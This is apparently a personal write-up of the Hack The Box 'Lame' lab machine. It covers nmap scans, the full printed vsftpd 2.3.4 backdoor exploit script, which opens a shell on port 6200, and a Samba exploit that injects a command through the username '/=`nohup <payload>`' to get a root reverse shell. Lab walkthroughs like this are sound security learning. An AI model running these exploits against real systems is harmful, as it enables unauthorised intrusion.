@@ -1,0 +1,90 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Lame Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+    
+    <h1>Lame Walkthrough</h1>
+    
+    <hr>
+    
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+    
+    <h2><a id="summary">Summary</a></h2>
+    
+    <p>Lame is a direct exploit to root box.  The old ftp service found running on this box turns out be a red herring and not exploitable as expected.  However, targetting the old samba SMB server will grant RCE as root once the exploit is ran correctly.</p>
+    
+    <h2><a id="portscan">Port Scanning</a></h2>
+    
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+    
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Mon Oct 11 16:35:42 2021 as: nmap -p- -oN ping_tcp 10.129.235.40&#13;&#10;Nmap scan report for 10.129.235.40&#13;&#10;Host is up (0.039s latency).&#13;&#10;Not shown: 65530 filtered ports&#13;&#10;PORT     STATE SERVICE&#13;&#10;21/tcp   open  ftp&#13;&#10;22/tcp   open  ssh&#13;&#10;139/tcp  open  netbios-ssn&#13;&#10;445/tcp  open  microsoft-ds&#13;&#10;3632/tcp open  distccd&#13;&#10;&#13;&#10;# Nmap done at Mon Oct 11 16:37:35 2021 -- 1 IP address (1 host up) scanned in 113.09 seconds&#13;&#10;    </pre>
+    
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+    
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Mon Oct 11 16:44:38 2021 as: nmap -p21,22,139,445,3632 -sV -sC -oN script_tcp 10.129.235.40&#13;&#10;Nmap scan report for 10.129.235.40&#13;&#10;Host is up (0.038s latency).&#13;&#10;&#13;&#10;PORT     STATE SERVICE     VERSION&#13;&#10;21/tcp   open  ftp         vsftpd 2.3.4&#13;&#10;|_ftp-anon: Anonymous FTP login allowed (FTP code 230)&#13;&#10;| ftp-syst: &#13;&#10;|   STAT: &#13;&#10;| FTP server status:&#13;&#10;|      Connected to 10.10.14.83&#13;&#10;|      Logged in as ftp&#13;&#10;|      TYPE: ASCII&#13;&#10;|      No session bandwidth limit&#13;&#10;|      Session timeout in seconds is 300&#13;&#10;|      Control connection is plain text&#13;&#10;|      Data connections will be plain text&#13;&#10;|      vsFTPd 2.3.4 - secure, fast, stable&#13;&#10;|_End of status&#13;&#10;22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)&#13;&#10;|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)&#13;&#10;139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)&#13;&#10;445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)&#13;&#10;3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))&#13;&#10;Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Host script results:&#13;&#10;|_clock-skew: mean: 1h59m50s, deviation: 2h49m45s, median: -11s&#13;&#10;| smb-os-discovery: &#13;&#10;|   OS: Unix (Samba 3.0.20-Debian)&#13;&#10;|   Computer name: lame&#13;&#10;|   NetBIOS computer name: &#13;&#10;|   Domain name: hackthebox.gr&#13;&#10;|   FQDN: lame.hackthebox.gr&#13;&#10;|_  System time: 2021-10-11T16:44:49-04:00&#13;&#10;| smb-security-mode: &#13;&#10;|   account_used: guest&#13;&#10;|   authentication_level: user&#13;&#10;|   challenge_response: supported&#13;&#10;|_  message_signing: disabled (dangerous, but default)&#13;&#10;|_smb2-time: Protocol negotiation failed (SMB2)&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Mon Oct 11 16:45:36 2021 -- 1 IP address (1 host up) scanned in 58.53 seconds&#13;&#10;    </pre>
+    
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>The first point of interest becomes FTP.  It is an older version and I am familiar with version 2.3.4 being exploitable.  So I use searchsploit to find the exploit for this version.</li>
+
+    <img src="../images/lame/searchsploit_vsftpd234.png">
+
+    <br>
+    <br>
+
+    <li>After downloading, I take a look to see what the script is attempting to do.</li>
+
+    <pre>&#13;&#10;# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution&#13;&#10;# Date: 9-04-2021&#13;&#10;# Exploit Author: HerculesRD&#13;&#10;# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html&#13;&#10;# Version: vsftpd 2.3.4&#13;&#10;# Tested on: debian&#13;&#10;# CVE : CVE-2011-2523&#13;&#10;&#13;&#10;#!/usr/bin/python3&#13;&#10;&#13;&#10;from telnetlib import Telnet&#13;&#10;import argparse&#13;&#10;from signal import signal, SIGINT&#13;&#10;from sys import exit&#13;&#10;&#13;&#10;def handler(signal_received, frame):&#13;&#10;    # Handle any cleanup here&#13;&#10;    print(&apos;   [+]Exiting...&apos;)&#13;&#10;    exit(0)&#13;&#10;&#13;&#10;signal(SIGINT, handler)&#13;&#10;parser=argparse.ArgumentParser()&#13;&#10;parser.add_argument(&quot;host&quot;, help=&quot;input the address of the vulnerable host&quot;, type=str)&#13;&#10;args = parser.parse_args()&#13;&#10;host = args.host&#13;&#10;portFTP = 21 #if necessary edit this line&#13;&#10;&#13;&#10;user=&quot;USER nergal:)&quot;&#13;&#10;password=&quot;PASS pass&quot;&#13;&#10;&#13;&#10;tn=Telnet(host, portFTP)&#13;&#10;tn.read_until(b&quot;(vsFTPd 2.3.4)&quot;) #if necessary, edit this line&#13;&#10;tn.write(user.encode(&apos;ascii&apos;) + b&quot;\n&quot;)&#13;&#10;tn.read_until(b&quot;password.&quot;) #if necessary, edit this line&#13;&#10;tn.write(password.encode(&apos;ascii&apos;) + b&quot;\n&quot;)&#13;&#10;&#13;&#10;tn2=Telnet(host, 6200)&#13;&#10;print(&apos;Success, shell opened&apos;)&#13;&#10;print(&apos;Send `exit` to quit shell&apos;)&#13;&#10;tn2.interact()&#13;&#10;    </pre>
+
+    <li>According to the script, if we connect to the FTP server and login as user "nergal:)" and password "pass" then we should be able to connect to port 6200 and gain a shell.  I make the attempt, but it is fruitless.  The exploit does not work.</li>
+
+    <img src="../images/lame/ftp_exploit.png">
+
+    <br>
+    <br>
+
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>I move on to the old samba SMB server running on this box.  According to nmap it is running samba smb 3.0.2.  I take a search for it on searchsploit to see if I can find an exploit.</li>
+
+    <img src="../images/lame/smb_searchsploit.png">
+
+    <br>
+    <br>
+
+    <li>The exploit unix/remote/16320.rb seems to match the version of samba we are running and will give us RCE.  In the spirit of no metasploit, I look at the script in vim to determine what is happening.</li>
+
+    <img src="../images/lame/smb_exploit_code.png">
+
+    <br>
+    <br>
+
+    <li>The above screenshot is the exploit portion of the script.  According to it, all we need to do is login as &quot;/=`nohup &lt;payload&gt;`&quot; in order to exploit smb and gain RCE.  In order to login with smb I first try smbclient but it gives me trouble.</li>
+
+    <img src="../images/lame/smbclient.png">
+
+    <br>
+    <br>
+
+    <li>Logging in with smbclient and using single quotes around the username did not work at all.  Then I tried with double quotes around the username and that just caused the reverse shell to connect from my local machine.  After facing this problem I tried logging using smbmap, crackmapexec, and then impacket-smbclient.  impacket-smbclient gave me the results intended.</li>
+
+    <img src="../images/lame/impacket-smbclient.png">
+
+    <li>With that, we gain a root shell.  The login methods used by each program must be working differently from program to program.  Lesson learned here - use all the tools available to you.</li>
+    
+</body>
+</html>
+
